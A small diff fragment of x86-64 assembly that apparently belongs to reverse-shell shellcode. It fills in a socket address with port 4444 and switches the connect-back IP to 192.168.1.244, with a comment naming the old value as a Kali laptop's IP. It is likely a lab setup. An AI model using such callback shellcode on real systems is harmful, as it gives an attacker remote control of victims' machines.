@@ -119,7 +119,7 @@ _start:
     lea   rbx, [rsp+0x28]    ; RCX for sockaddr starts 32 bytes down
     mov   word [rbx+0], 2
     mov   word [rbx+2], 0x5c11
-    mov   dword [rbx+4], 0x9ad31c0a     
+    mov   dword [rbx+4], 0xf401a8c0         ; 0xf401a8c0 = 192.168.1.244 // 0x9ad31c0a == <laptop kali ip>  
     mov   rcx, r13
     mov   rdx, rbx
     mov   r8d, 16
